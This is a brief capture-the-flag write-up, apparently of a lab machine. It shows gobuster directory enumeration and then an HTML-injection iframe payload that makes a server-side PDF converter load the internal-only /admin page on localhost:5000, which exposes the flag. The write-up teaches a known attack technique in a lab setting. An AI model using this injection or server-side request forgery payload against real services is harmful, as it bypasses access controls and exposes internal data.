Using **gobuster**:
gobuster dir -u http://10.10.56.164 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

I got this results:

/admin                (Status: 403) [Size: 166]
/convert              (Status: 405) [Size: 178]


I tried accessing the /admin page:
Forbidden

This page can only be seen internally (localhost:5000)


This localhost gave me an idea. I tried **HTML injection**:
<iframe src="http://127.0.0.1:5000/admin"> </iframe>

src="http://127.0.0.1:5000/admin" tells the browser (or in this case, the server rendering the PDF) to load the internal /admin page
Since this request is made from the server itself it bypasses my external IP restriction.

So the website rendered the flag inside http://127.0.0.1:5000/admin into the pdf.
